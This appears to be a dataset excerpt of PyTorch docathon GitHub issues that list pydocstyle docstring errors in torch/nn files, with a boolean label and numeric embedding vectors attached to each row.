- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LayerNorm`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LayerNorm`, **Line**: 88, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `GroupNorm`, **Line**: 199, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `GroupNorm`, **Line**: 199, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `GroupNorm`, **Line**: 199, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ConstantPad1d`, **Line**: 32, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ConstantPad2d`, **Line**: 83, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ConstantPad3d`, **Line**: 134, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReflectionPad1d`, **Line**: 185, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReflectionPad2d`, **Line**: 226, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReflectionPad3d`, **Line**: 278, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReplicationPad1d`, **Line**: 342, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReplicationPad2d`, **Line**: 383, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ReplicationPad3d`, **Line**: 435, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ZeroPad1d`, **Line**: 476, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/padding.py`, **Entity**: `ZeroPad2d`, **Line**: 528, **Description**: 1 blank line required after class docstring (found 0)

cc @carljparker",False,"[-1.94781348e-02 -4.99621063e-01 -2.04821602e-02 -2.95266062e-01
 -3.66207026e-03 -1.06128156e-01 -1.11385956e-01  1.15141168e-01
 -4.49829072e-01  1.64931476e-01 -3.75112072e-02  1.00681245e-01
  1.41084254e-01  3.32849205e-01 -1.92015037e-01  2.68018186e-01
 -4.16040689e-01 -3.53762746e-01  9.43609551e-02  2.54329145e-01
  8.10685754e-02  3.74607444e-01  3.83318439e-02  1.99974645e-02
 -2.73175329e-01  1.12708546e-01 -2.36221299e-01 -1.99096933e-01
  5.18158935e-02 -1.30045682e-01  9.55301672e-02  3.28798473e-01
 -1.05772234e-01 -1.03899717e-01  3.02176893e-01  3.56784731e-01
 -2.48599812e-01 -1.20617509e-01 -9.31967050e-02  1.55244887e-01
 -5.11313379e-02 -1.24749325e-01 -5.18925898e-02 -5.41532487e-02
  7.87480474e-02 -1.34268641e-01 -2.80896485e-01  3.65155488e-01
 -8.04016143e-02  1.34109646e-01  6.89589977e-02  1.38764068e-01
 -3.42206210e-01 -6.76325858e-02  1.60255492e-01  2.37329707e-01
 -2.15542644e-01  4.88697886e-01 -4.07755449e-02 -1.32896071e-02
  3.18796709e-02  2.70553380e-01 -9.70039293e-02  4.40034866e-01
 -1.05155110e-01  4.16089535e-01  1.33856237e-01  2.28350118e-01
  2.60476947e-01 -7.48555362e-03 -1.28008619e-01  7.45197907e-02
 -5.37275016e-01 -2.48289052e-02  1.52593017e-01  2.29567394e-01
 -2.15853274e-01  3.15978937e-02 -3.10953707e-01 -3.01284075e-01
 -1.64661750e-01 -1.03408590e-01  4.87617701e-02 -6.56013638e-02
 -1.07477687e-01 -2.43202835e-01  2.30614513e-01 -1.45638108e-01
  1.21108055e-01  1.36798888e-01  4.68886137e-01 -1.80359870e-01
 -2.78257251e-01  3.77134889e-01 -4.95404378e-03  2.20113367e-01
 -3.50353345e-02 -3.41012441e-02  1.06583863e-01 -7.58196563e-02
  7.65367225e-02 -2.96481222e-01 -4.61303815e-02  2.97258615e-01
  7.54428878e-02 -9.24118459e-02  1.12813428e-01 -1.11035168e-01
  2.80905604e-01  1.14639558e-01  1.37699127e-01 -1.96652681e-01
  2.39158988e-01  1.60998389e-01  2.42214888e-01 -1.37744173e-01
 -1.82956770e-01  1.18534520e-01 -2.57887125e-01 -4.95322496e-02
  1.19395852e-01  1.03597730e-01  8.12198818e-02  8.32917467e-02
  3.76130864e-02  3.93751338e-02  1.52611047e-01 -1.95238963e-02
  6.70206249e-02 -4.01105195e-01  1.77622974e-01 -9.69059914e-02
 -2.19112664e-01  4.87688258e-02  1.54391944e-01  1.16885170e-01
 -1.85600922e-01 -3.71689975e-01 -4.91404906e-02 -1.12882301e-01
 -2.88654268e-01 -5.69046378e-01 -1.00003712e-01 -1.36655405e-01
  2.51903474e-01  4.29183245e-01 -5.19198656e-01  3.07282835e-01
 -5.42701781e-02  1.70936286e-01 -3.45789269e-02  9.60053727e-02
 -1.33793905e-01  2.50207260e-02  3.71371061e-02 -1.13506056e-01
  4.40096974e-01 -2.79284734e-02 -2.24664956e-01 -2.96907246e-01
 -2.01424006e-02 -2.21987534e-02 -7.82375783e-02 -2.04054326e-01
 -2.23172724e-01  1.25154495e-01 -1.69371247e-01 -8.16224143e-02
 -4.20411706e-01 -1.93635255e-01  2.48989508e-01  9.90237445e-02
 -1.03641182e-01 -1.75141409e-01  2.07179368e-01  5.86657226e-02
 -4.24836487e-01 -3.38476926e-01  1.21898782e-02  2.21368909e-01
 -7.79333264e-02  5.04489779e-01 -1.97449122e-02  8.32666829e-03
 -2.11465806e-01  6.52981848e-02  8.59468058e-02  3.61658931e-02
  2.23617330e-01  3.64253610e-01  6.32471442e-02 -3.83876383e-01
  1.04393713e-01  4.52193357e-02 -1.78097393e-02 -2.14385707e-02
  4.20487285e-01  5.93512297e-01  4.30474132e-02  2.01328665e-01
 -2.47014940e-01  2.97026843e-01  3.21805120e-01 -7.02670291e-02
  4.62753236e-01 -2.02124342e-02 -3.19651484e-01 -2.68309206e-01
 -2.05576077e-01  3.17785829e-01 -3.43699992e-01  7.55641535e-02
 -1.29917502e-01 -3.32133472e-01 -2.19312027e-01  3.44548672e-01
  2.08866537e-01 -1.69595480e-01  2.59000778e-01 -1.25231206e-01
 -2.91842759e-01 -3.04082856e-02 -1.09223217e-01 -2.59214193e-01
  3.52878451e-01  7.87023157e-02 -2.64545903e-04  1.49856463e-01
 -1.25665203e-01  8.26501399e-02  3.07864062e-02  9.93937403e-02
  6.25732780e-01 -2.80759394e-01  1.44636378e-01  2.33133554e-01
  6.31464124e-02  4.29720357e-02  1.35991633e-01  2.04755992e-01
 -7.36384690e-02  8.59263763e-02 -3.58727612e-02  5.16729057e-02
  1.51950866e-01 -3.48365724e-01 -3.08983028e-01 -1.83528364e-01
 -3.48431826e-01  1.44675598e-01 -4.66283858e-01 -1.83712944e-01
  1.80322349e-01  6.86743334e-02  5.11413097e-01 -1.87894497e-02
 -4.75181282e-01 -2.73542285e-01  2.02512816e-02  2.27050990e-01
 -3.95080671e-02  3.50625277e-01 -8.68122354e-02  3.15719455e-01
  3.24990988e-01 -1.22312382e-01 -3.38694096e-01  1.22643903e-01
  1.43876374e-01 -2.61468291e-01  8.32798854e-02 -5.58325648e-01
  2.58814156e-01  2.31298044e-01  4.59812552e-01  1.91137671e-01
  2.06101522e-01  6.77681267e-02 -6.98421597e-02 -5.53390905e-02
 -3.13451529e-01  4.17732120e-01 -3.70983124e-01 -1.65975451e-01
  3.96122366e-01 -8.36343691e-02 -1.95226893e-01 -2.86977947e-01
 -4.00352031e-01 -1.89404577e-01 -1.03230536e-01 -1.37770046e-02
  3.67118180e-01 -1.96927655e-02 -1.20960839e-01  2.36883879e-01
  8.27868655e-02  3.16030115e-01  3.62800688e-01  7.21939728e-02
 -3.42691958e-01 -8.56962055e-02 -6.09878190e-02  4.45324183e-01
  2.59284914e-01  2.73219645e-01  8.52844566e-02  1.17169917e-01
 -2.72196736e-02 -2.88722575e-01  3.79149288e-01  2.18233123e-01
 -2.99340963e-01  8.76006931e-02  9.53660756e-02  5.54771200e-02
  1.36374950e-01  5.18945456e-01  1.62684932e-01  4.53183129e-02
 -2.43738502e-01 -3.42619836e-01 -3.54122937e-01  1.20727941e-01
  1.61124438e-01 -1.19012028e-01 -2.09313348e-01  4.97899503e-02
 -2.42165968e-01 -4.87281710e-01  1.49142414e-01  1.18424505e-01
 -8.74723420e-02 -1.90980196e-01  6.69071004e-02  8.42917114e-02
 -2.87401497e-01  2.71113783e-01 -4.38645221e-02 -1.41835973e-01
 -3.17559280e-02 -9.51261520e-02  6.80128485e-03 -4.66879994e-01
 -4.13149633e-02 -1.43429220e-01 -1.89927779e-03  2.44351357e-01
 -2.52429068e-01 -4.82265055e-01  5.52578986e-01 -2.97983885e-02
 -2.99971461e-01  2.93439422e-02 -1.35216445e-01  5.28428197e-01
 -4.24841642e-02  2.67340869e-01 -1.70221165e-01  3.42656970e-01
 -5.02892733e-01 -1.79816842e-01 -2.26012528e-01 -4.11518633e-01
 -7.49390572e-04 -2.87557364e-01 -8.97694007e-02  6.05674461e-02
  1.27375901e-01 -1.53334271e-02 -1.03420869e-01  2.18031257e-01
 -5.48426509e-02  2.58092225e-01  3.35013002e-01  2.35758618e-01
  1.85235575e-01  1.34282961e-01  6.08079731e-02 -1.98407680e-01
 -7.41588950e-01  4.19480503e-01  3.09022129e-01 -1.76396370e-01]"
Fix docstring errors in functional.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/functional.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `fractional_max_pool2d_with_indices`, **Line**: 433, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `fractional_max_pool3d_with_indices`, **Line**: 532, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_pool1d_with_indices`, **Line**: 641, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_pool2d_with_indices`, **Line**: 727, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_pool3d_with_indices`, **Line**: 813, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `max_unpool1d`, **Line**: 931, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `max_unpool2d`, **Line**: 967, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `max_unpool3d`, **Line**: 999, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool2d`, **Line**: 1030, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool2d`, **Line**: 1030, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool2d`, **Line**: 1030, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool1d`, **Line**: 1055, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool1d`, **Line**: 1055, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `lp_pool1d`, **Line**: 1055, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_max_pool1d_with_indices`, **Line**: 1076, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_max_pool2d_with_indices`, **Line**: 1118, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_max_pool3d_with_indices`, **Line**: 1162, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool2d`, **Line**: 1219, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool2d`, **Line**: 1219, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool2d`, **Line**: 1219, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool3d`, **Line**: 1236, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool3d`, **Line**: 1236, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `adaptive_avg_pool3d`, **Line**: 1236, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout`, **Line**: 1254, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout`, **Line**: 1254, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/functional.py`, **Entity**: `alpha_dropout`, **Line**: 1274, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout1d`, **Line**: 1286, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout1d`, **Line**: 1286, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout2d`, **Line**: 1324, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout2d`, **Line**: 1324, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `dropout3d`, **Line**: 1368, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `dropout3d`, **Line**: 1368, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `feature_alpha_dropout`, **Line**: 1407, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `feature_alpha_dropout`, **Line**: 1407, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/functional.py`, **Entity**: `relu`, **Line**: 1465, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `relu`, **Line**: 1465, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `glu`, **Line**: 1490, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `glu`, **Line**: 1490, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `hardtanh`, **Line**: 1515, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `hardtanh`, **Line**: 1515, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `relu6`, **Line**: 1541, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `relu6`, **Line**: 1541, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `elu`, **Line**: 1557, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `selu`, **Line**: 1581, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `selu`, **Line**: 1581, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `celu`, **Line**: 1610, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `celu`, **Line**: 1610, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `leaky_relu`, **Line**: 1637, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `leaky_relu`, **Line**: 1637, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `rrelu`, **Line**: 1687, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `rrelu`, **Line**: 1687, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `tanhshrink`, **Line**: 1754, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `tanhshrink`, **Line**: 1754, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `softsign`, **Line**: 1766, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `softsign`, **Line**: 1766, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `softmin`, **Line**: 1806, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `softmax`, **Line**: 1832, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `gumbel_softmax`, **Line**: 1868, **Description**: First line should be in imperative mood (perhaps 'Sample', not 'Samples')
- **File**: `torch/nn/functional.py`, **Entity**: `log_softmax`, **Line**: 1930, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `tanh`, **Line**: 1969, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `tanh`, **Line**: 1969, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `sigmoid`, **Line**: 1980, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `sigmoid`, **Line**: 1980, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `hardsigmoid`, **Line**: 1990, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/functional.py`, **Entity**: `hardsigmoid`, **Line**: 1990, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `silu`, **Line**: 2057, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `silu`, **Line**: 2057, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `mish`, **Line**: 2081, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `mish`, **Line**: 2081, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `hardswish`, **Line**: 2100, **Description**: First line should end with a period (not '
- **File**: `torch/nn/functional.py`, **Entity**: `hardswish`, **Line**: 2100, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `embedding`, **Line**: 2136, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/functional.py`, **Entity**: `embedding`, **Line**: 2136, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/functional.py`, **Entity**: `embedding_bag`, **Line**: 2254, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `embedding_bag`, **Line**: 2254, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `embedding_bag`, **Line**: 2254, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `batch_norm`, **Line**: 2462, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `instance_norm`, **Line**: 2507, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `instance_norm`, **Line**: 2507, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/functional.py`, **Entity**: `instance_norm`, **Line**: 2507, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `layer_norm`, **Line**: 2540, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `group_norm`, **Line**: 2554, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `local_response_norm`, **Line**: 2567, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `local_response_norm`, **Line**: 2567, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `local_response_norm`, **Line**: 2567, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `ctc_loss`, **Line**: 2614, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/nn/functional.py`, **Entity**: `nll_loss`, **Line**: 2682, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/nn/functional.py`, **Entity**: `kl_div`, **Line**: 2898, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `kl_div`, **Line**: 2898, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/functional.py`, **Entity**: `kl_div`, **Line**: 2898, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/nn/functional.py`, **Entity**: `cross_entropy`, **Line**: 2981, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy`, **Line**: 3072, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy`, **Line**: 3072, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy`, **Line**: 3072, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy_with_logits`, **Line**: 3142, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy_with_logits`, **Line**: 3142, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy_with_logits`, **Line**: 3142, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `smooth_l1_loss`, **Line**: 3214, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `smooth_l1_loss`, **Line**: 3214, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `smooth_l1_loss`, **Line**: 3214, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `huber_loss`, **Line**: 3254, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `huber_loss`, **Line**: 3254, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `huber_loss`, **Line**: 3254, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `l1_loss`, **Line**: 3285, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `l1_loss`, **Line**: 3285, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `mse_loss`, **Line**: 3316, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `mse_loss`, **Line**: 3316, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `margin_ranking_loss`, **Line**: 3349, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `margin_ranking_loss`, **Line**: 3349, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `hinge_embedding_loss`, **Line**: 3387, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `hinge_embedding_loss`, **Line**: 3387, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_margin_loss`, **Line**: 3416, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_margin_loss`, **Line**: 3416, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `soft_margin_loss`, **Line**: 3444, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `soft_margin_loss`, **Line**: 3444, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_soft_margin_loss`, **Line**: 3467, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_soft_margin_loss`, **Line**: 3467, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `cosine_embedding_loss`, **Line**: 3515, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `cosine_embedding_loss`, **Line**: 3515, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `multi_margin_loss`, **Line**: 3548, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `multi_margin_loss`, **Line**: 3548, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `upsample`, **Line**: 3723, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `upsample`, **Line**: 3723, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/functional.py`, **Entity**: `_is_integer`, **Line**: 3788, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `interpolate`, **Line**: 3824, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `interpolate`, **Line**: 3824, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/functional.py`, **Entity**: `grid_sample`, **Line**: 4171, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `grid_sample`, **Line**: 4171, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `affine_grid`, **Line**: 4313, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `affine_grid`, **Line**: 4313, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `affine_grid`, **Line**: 4313, **Description**: First line should be in imperative mood (perhaps 'Generate', not 'Generates')
- **File**: `torch/nn/functional.py`, **Entity**: `triplet_margin_loss`, **Line**: 4607, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/functional.py`, **Entity**: `triplet_margin_loss`, **Line**: 4607, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/functional.py`, **Entity**: `triplet_margin_with_distance_loss`, **Line**: 4642, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/functional.py`, **Entity**: `normalize`, **Line**: 4704, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/functional.py`, **Entity**: `unfold`, **Line**: 4742, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/nn/functional.py`, **Entity**: `fold`, **Line**: 4772, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `fold`, **Line**: 4772, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/functional.py`, **Entity**: `fold`, **Line**: 4772, **Description**: First line should be in imperative mood (perhaps 'Combine', not 'Combines')
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection_packed`, **Line**: 4799, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection_packed`, **Line**: 4799, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection`, **Line**: 4866, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection`, **Line**: 4866, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection`, **Line**: 4866, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/functional.py`, **Entity**: `multi_head_attention_forward`, **Line**: 5112, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `multi_head_attention_forward`, **Line**: 5112, **Description**: First line should end with a period (not '

cc @carljparker",False,"[-0.20596607 -0.16106926 -0.05611382 -0.13881688  0.00533129 -0.22726917
 -0.00537127  0.24520224 -0.34168026  0.09265891  0.09532966 -0.08106381
  0.03169705  0.17208281 -0.01185694  0.00819257 -0.27750477 -0.52870464
  0.01363122  0.10739124  0.04465359  0.49169463 -0.06265039  0.13363731
 -0.11622311  0.07612796 -0.3656203  -0.07408002  0.08987146  0.19880658
  0.3291182   0.11126318 -0.3765801   0.01828177  0.42252338  0.35500753
 -0.10480119 -0.12147406  0.03522705  0.05224955 -0.10747501 -0.17444864
